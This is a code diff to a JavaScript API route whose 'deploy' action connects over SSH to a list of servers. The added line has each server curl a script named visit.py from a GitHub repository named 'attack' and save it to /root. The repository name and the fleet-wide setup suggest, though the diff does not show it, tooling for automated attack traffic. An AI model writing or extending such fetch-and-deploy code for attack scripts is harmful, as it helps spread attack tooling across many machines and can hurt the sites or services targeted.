@@ -169,7 +169,8 @@ export async function POST(req) {
     } else if (action === 'deploy') {
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, 'wc -c /root/visit.py && grep -c auto_detect_mode /root/visit.py && echo "Script verified"', 8000);
+          const deployCmd = 'curl -sL "https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py" -o /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"';
+          const r = await runSSHCommand(server, deployCmd, 15000);
           return { host: server.host, ...r };
         })
       );
